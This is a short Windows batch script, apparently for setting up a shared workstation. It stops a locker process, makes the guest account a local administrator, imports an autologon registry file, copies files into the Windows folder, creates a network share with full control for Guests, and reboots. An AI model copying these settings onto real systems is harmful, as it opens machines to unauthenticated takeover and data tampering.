@echo off
taskkill /f /im wLocker.exe
ping -w 1000 127.0.0.1 >> null
net user guest /ADD
net localgroup Администраторы guest /ADD
copy /Y  /Z  files\*.* C:\Windows\*.*
copy /Y /Z D:\Public\rab_st.exe E:\*.*
regedit /s files\autologon.reg
mkdir d:\public
net share public=d:\public
cacls d:\public /e /g BUILTIN\Гости:F
cacls d:\public /e /g Гости:F
cacls E:\ /E /D Guest
shutdown -r -t 02
exit 0